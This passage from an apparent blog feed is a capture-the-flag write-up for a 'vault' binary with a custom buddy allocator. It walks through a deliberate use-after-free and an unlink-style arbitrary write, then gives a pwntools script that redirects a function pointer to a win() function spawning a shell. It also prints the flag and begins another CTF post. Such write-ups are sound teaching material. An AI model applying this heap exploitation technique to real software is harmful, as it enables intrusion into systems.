<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define MAGIC_COOKIE_BYTES 32
</span></span></span><span class="line"><span class="cl"><span class="cp">#define ADDRESS_BITS (8 * sizeof(void *))
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">buddy</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint8_t</span> <span class="n">magic</span><span class="p">[</span><span class="n">MAGIC_COOKIE_BYTES</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">free_block</span> <span class="o">*</span><span class="p">(</span><span class="n">avail</span><span class="p">[</span><span class="n">ADDRESS_BITS</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">root_logsize</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span><span class="n">base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><p>The <code>allocate</code> and <code>liberate</code> functions are similar to that of <code>malloc()</code> and <code>free()</code> respectively.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// Allocate a block of size &gt;= @size
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="o">*</span><span class="nf">allocate</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="k">struct</span> <span class="n">buddy</span> <span class="o">*</span><span class="n">state</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Liberate a block of size @size starting at @base.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">liberate</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">base</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="k">struct</span> <span class="n">buddy</span> <span class="o">*</span><span class="n">state</span><span class="p">);</span>
</span></span></code></pre></div><p>Each freed memory block is represented by the following struct. With both <code>next</code> and <code>pprev</code> pointers, this is a doubly linked list, similar to that of e.g. a small bin. The <code>magic</code> value is 32 random bytes to verify that a block is indeed freed. <code>logsize</code> is the size of the freed block.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">free_block</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">free_block</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">free_block</span> <span class="o">**</span><span class="n">pprev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint8_t</span> <span class="n">magic</span><span class="p">[</span><span class="n">MAGIC_COOKIE_BYTES</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint8_t</span> <span class="n">logsize</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><h3 id="analysis---main">Analysis - main</h3>
<p>Now, let’s check out <code>main.c</code>. The initialising function, <code>init_app()</code>, is below.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define POOL_SIZE 1024
</span></span></span><span class="line"><span class="cl"><span class="cp">#define CHUNK_SIZE 0x80
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">buddy</span> <span class="n">state</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">uint8_t</span> <span class="n">pool</span><span class="p">[</span><span class="n">POOL_SIZE</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">vault</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)()</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">safe_notify</span><span class="p">()</span> <span class="p">{</span> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Notification: Your vault is secure.&#34;</span><span class="p">);</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Access granted! Spawning shell...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="n">vault_functions</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">init_app</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">    <span class="c1">// initialise vault_functions
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">vault_functions</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">win</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">vault_functions</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">safe_notify</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// value of fp is the pointer to safe_notify
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">fp</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">vault_functions</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// randomly generate magic cookie bytes (used in magic_buddy)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint8_t</span> <span class="n">magic</span><span class="p">[</span><span class="n">MAGIC_COOKIE_BYTES</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">getrandom</span><span class="p">(</span><span class="n">magic</span><span class="p">,</span> <span class="n">MAGIC_COOKIE_BYTES</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">!=</span> <span class="n">MAGIC_COOKIE_BYTES</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;getrandom&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// initialises a buddy (via magic_buddy)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">init_buddy</span><span class="p">(</span><span class="n">pool</span><span class="p">,</span> <span class="n">POOL_SIZE</span><span class="p">,</span> <span class="n">magic</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">state</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>In <code>main()</code>, the binary has a CRUD-like menu of options.</p>
<p><strong>Option 1</strong>. <code>create_vault</code>: allocates a new block, allowing us to write to it. The <code>allocate()</code> function is similar to <code>malloc()</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">create_vault</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// checks vault is empty, i.e. no block has been allocated
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">vault</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Vault entry already exists!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// allocate a block
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">vault</span> <span class="o">=</span> <span class="nf">allocate</span><span class="p">(</span><span class="n">CHUNK_SIZE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">state</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">vault</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Allocation failed.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// get input, write to block
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter your vault note (max %d bytes): &#34;</span><span class="p">,</span> <span class="n">CHUNK_SIZE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">vault</span><span class="p">,</span> <span class="n">CHUNK_SIZE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><strong>Option 2</strong>. <code>edit_vault</code>: edits the value of the block</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">edit_vault</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">vault</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;No vault entry exists!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter new vault note (max %d bytes): &#34;</span><span class="p">,</span> <span class="n">CHUNK_SIZE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">vault</span><span class="p">,</span> <span class="n">CHUNK_SIZE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><strong>Option 3</strong>. <code>delete_vault</code>: liberates the block. However, the vault entry is not cleared afterwards. This means we have a use-after-free (UAF) primitive.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">delete_vault</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">vault</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;No vault entry exists!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Deleting your vault entry...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">liberate</span><span class="p">(</span><span class="n">vault</span><span class="p">,</span> <span class="n">CHUNK_SIZE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">state</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// vault is not nullified =&gt; UAF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span></code></pre></div><p><strong>Option 4</strong>. <code>allocate_new_vault()</code>: allocates a new block, however we cannot directly write to it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">allocate_new_vault</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">vault</span> <span class="o">=</span> <span class="nf">allocate</span><span class="p">(</span><span class="n">CHUNK_SIZE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">state</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">vault</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Allocation failed.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;New vault entry allocated at: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">vault</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><strong>Option 5</strong>:. <code>send_notification</code>: typically, this will run <code>safe_notify()</code>. As such, our goal will be to overwrite <code>fp</code> to <code>&amp;vault_functions[0]</code>, aka the pointer to <code>win()</code>. Then, choosing this option will give us a shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">send_notification</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">fp2</span><span class="p">)()</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="n">fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Sending notification...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fp2</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h3 id="exploit-1">Exploit</h3>
<p>Since there is UAF, let’s check out <code>allocate()</code> and see what values in the freed block we can change to get arb write.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="o">*</span><span class="nf">_allocate</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">logsize</span><span class="p">,</span> <span class="k">struct</span> <span class="n">buddy</span> <span class="o">*</span><span class="n">state</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">logsize</span> <span class="o">&gt;</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">root_logsize</span><span class="p">)</span> <span class="c1">// check if requested size is too large
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">avail</span><span class="p">[</span><span class="n">logsize</span><span class="p">])</span> <span class="p">{</span> <span class="c1">// check if there is an existing freed block of the correct size that can be used instead
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">struct</span> <span class="n">free_block</span> <span class="o">*</span><span class="n">block</span> <span class="o">=</span> <span class="nf">pop</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">avail</span><span class="p">[</span><span class="n">logsize</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">memset</span><span class="p">(</span><span class="n">block</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">free_block</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">block</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">logsize</span> <span class="o">==</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">root_logsize</span><span class="p">)</span> <span class="c1">// check if requested size is too large
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">free_block</span> <span class="o">*</span><span class="n">parent</span> <span class="o">=</span> <span class="nf">_allocate</span><span class="p">(</span><span class="n">logsize</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">state</span><span class="p">);</span> <span class="c1">// allocate a parent block
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">parent</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">free_block</span> <span class="o">*</span><span class="n">buddy</span> <span class="o">=</span> <span class="nf">buddy_of</span><span class="p">(</span><span class="n">parent</span><span class="p">,</span> <span class="n">logsize</span><span class="p">,</span> <span class="n">state</span><span class="p">);</span> <span class="c1">// get buddy of parent
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// split @parent in half and place the buddy on the avail list.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">memcpy</span><span class="p">(</span><span class="n">buddy</span><span class="o">-&gt;</span><span class="n">magic</span><span class="p">,</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">magic</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">magic</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nf">push</span><span class="p">(</span><span class="n">buddy</span><span class="p">,</span> <span class="n">logsize</span><span class="p">,</span> <span class="n">state</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">parent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="nf">allocate</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="k">struct</span> <span class="n">buddy</span> <span class="o">*</span><span class="n">state</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">free_block</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">free_block</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">_allocate</span><span class="p">(</span><span class="nf">size2log</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span> <span class="n">state</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Particularly, <code>pop()</code> removes the block from the doubly linked list. This is functionally the same as the unlink mechanism in glibc heap. It writes the value of <code>block-&gt;next</code> to the address given by <code>block-&gt;pprev</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="k">struct</span> <span class="n">free_block</span> <span class="o">*</span><span class="nf">pop</span><span class="p">(</span><span class="k">struct</span> <span class="n">free_block</span> <span class="o">*</span><span class="n">block</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// writes the value of block-&gt;next to the address given by block-&gt;pprev
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">*</span><span class="p">(</span><span class="n">block</span><span class="o">-&gt;</span><span class="n">pprev</span><span class="p">)</span> <span class="o">=</span> <span class="n">block</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">block</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// writes the value of block-&gt;pprev at a 8 byte offset to the address given by block-&gt;next
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">block</span><span class="o">-&gt;</span><span class="n">next</span><span class="o">-&gt;</span><span class="n">pprev</span> <span class="o">=</span> <span class="n">block</span><span class="o">-&gt;</span><span class="n">pprev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">block</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>So, we could effectively perform an unlink exploit, editing the values of the <code>next</code> and <code>pprev</code> in order to get arb write. However, we can only write a maximum of 16 bytes, else we would edit <code>magic</code>, causing the block to be considered invalid.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// interpret @block as a block at depth @logsize. is it free?
</span></span></span><span class="line"><span class="cl"><span class="c1">// block-&gt;magic needs to be equal to state-&gt;magic
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kt">int</span> <span class="nf">isfree</span><span class="p">(</span><span class="k">struct</span> <span class="n">free_block</span> <span class="o">*</span><span class="n">block</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">logsize</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                  <span class="k">struct</span> <span class="n">buddy</span> <span class="o">*</span><span class="n">state</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">!</span><span class="nf">memcmp</span><span class="p">(</span><span class="n">block</span><span class="o">-&gt;</span><span class="n">magic</span><span class="p">,</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">magic</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">magic</span><span class="p">))</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">           <span class="n">block</span><span class="o">-&gt;</span><span class="n">logsize</span> <span class="o">==</span> <span class="n">logsize</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><figure>
    <img src="assets/vault_1.png">
    <figcaption>(top) the current state of the freed block
    (bottom) the current state of fp & vault_functions</figcaption>
</figure>
<p>We want to overwrite <code>fp</code> (of address <code>0x405708</code>) to <code>0x405710</code> (the address of <code>vault_functions[0]</code>, aka a pointer to <code>win()</code>).</p>
<p>To do that, we can take advtange of the line <code>*(block-&gt;pprev) = block-&gt;next;</code> in <code>pop()</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># create_vault()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Your choice:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;dsds&#39;</span> <span class="c1">#any garbage value</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># delete the vault, there is UAF</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Your choice:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># edit the vault</span>
</span></span><span class="line"><span class="cl"><span class="c1"># block-&gt;next is at offset 0, block-&gt;pprev is at offset 8</span>
</span></span><span class="line"><span class="cl"><span class="c1"># pop() writes the value of `block-&gt;next` to the address given by `block-&gt;pprev`</span>
</span></span><span class="line"><span class="cl"><span class="c1"># address of vault_functions[0], aka the pointer to win(), is written to fp</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Your choice:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x405710</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x405708</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span></code></pre></div>


    <blockquote class="alert alert-caution">
        <p class="alert-heading">
            ❗
            <b>
                
                    Caution
                
            </b>
        </p>
        <p>A second write occurs in the function with the line <code>block-&gt;next-&gt;pprev = block-&gt;pprev</code>.
If <code>block-&gt;next-&gt;pprev</code> happens to be a non-writable memory address, the binary will crash.</p>
    </blockquote>
<p>Then, we need to allocate a new block via <code>allocate_new_vault()</code> to trigger the exploit. <code>fp</code> will be successfully overwritten. Finally, we can simply run <code>send_notification()</code> to get a shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># allocate_new_vault to trigger pop() to run, aka have win() be written to fp</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Your choice:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># run send_notification() -&gt; win()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Your choice:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;5&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><figure>
    <img src="assets/vault_2.png">
    <figcaption>freed block has been edited</figcaption>
</figure>
<figure>
    <img src="assets/vault_3.png">
    <figcaption>fp & vault_functions have been overwritten</figcaption>
</figure>
<p>Flag: <code>Breach{m4g1c_u4f_70_v4u17_c0n7r01}</code></p>
]]></content>
        </item>
        
        <item>
            <title>Grey Cat The Flag Quals 2024</title>
            <link>https://enxgmatic.github.io/blog/gctf-quals24/</link>
            <pubDate>Sun, 12 May 2024 22:50:19 +0800</pubDate>
            
            <guid>https://enxgmatic.github.io/blog/gctf-quals24/</guid>
            <description>&lt;h2 id=&#34;slingring-factory&#34;&gt;Slingring Factory&lt;/h2&gt;
&lt;p&gt;Category: Pwn&lt;/p&gt;
&lt;p&gt;In following Greycat&amp;rsquo;s adventures, you have stumbled upon a factory that produces weirdly-shaped rings. Upon closer inspection, you realise that the rings seem very familiar &amp;ndash; they looked exactly like the Sling Rings you saw from the Marvel Comics universe! Having some time leftover, you decide to explore the factory. Alas, you eventually come to realise that these Sling Rings were in fact not the same as those you knew: during forging, their destinations have to already be set. You wonder what you could do with these rings&amp;hellip;&lt;/p&gt;</description>
